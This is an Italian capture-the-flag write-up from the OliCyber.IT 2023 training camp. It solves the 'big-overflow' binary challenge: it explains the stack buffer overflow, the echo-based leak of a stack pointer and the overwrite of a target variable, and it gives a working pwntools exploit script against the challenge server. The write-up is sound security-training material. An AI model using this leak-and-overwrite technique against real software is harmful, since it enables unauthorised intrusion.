# OliCyber.IT 2023 - Simulazione training camp 1

## [binary] big-overflow (5 risoluzioni)

La challenge chiede di inserire una stringa, e la scrive in un buffer sullo stack. Subito dopo stampa la stessa stringa, e ne chiede un'altra con cui la sovrascrive.

Il numero di byte che il programma legge è maggiore della lunghezza del buffer, quindi si può sovrascrivere la memoria che sullo stack si trovo dopo il buffer.

Il programma poi confronta una variabile sullo stack con 0x5ab1bb0, e se corrispondesse, stamperebbe la flag.

### Soluzione

Il buffer ha dimensione 32, e subito dopo sullo stack c'è un puntatore utilizzato, e dopo ancora la variabile di interesse.

Se il puntatore venisse sovrascritto con dati random, il programma andrebbe in crash qualora provasse a stampare la flag (il puntatore è il file di output dato in argomento a `fprintf`).

Dato che il programma fa un echo della stringa da noi inserita, possiamo arrivare in memoria fino all'inizio del puntatore per ottenerne il valore (edge case: se il puntatore contiene \x00 questo non funziona, ma succede raramante).

Una volta ottenuto il valore del puntatore si può riscrivere il buffer con: `[32 byte random] + [puntatore ottenuto] + [0x5ab1bb0]`.

### Exploit

```sh
#!/bin/python3

from pwn import *
import binascii

HOST = os.environ.get("HOST", "big-overflow.challs.olicyber.it")
PORT = int(os.environ.get("PORT", 34003))

io = remote(HOST, PORT)

io.recvuntil(b"Hello, what's your name?")
io.sendline(b"A"*31)
o = io.recvuntil(b"but")[:-3]
log.success(binascii.hexlify(o[41:][::-1]))

io.recvuntil(b"please: ")
io.sendline(b"A"*32 + (o[41:]) + b"\x00" * (7-len(o[42:])) + p32(0x5ab1bb0))
io.interactive()

```
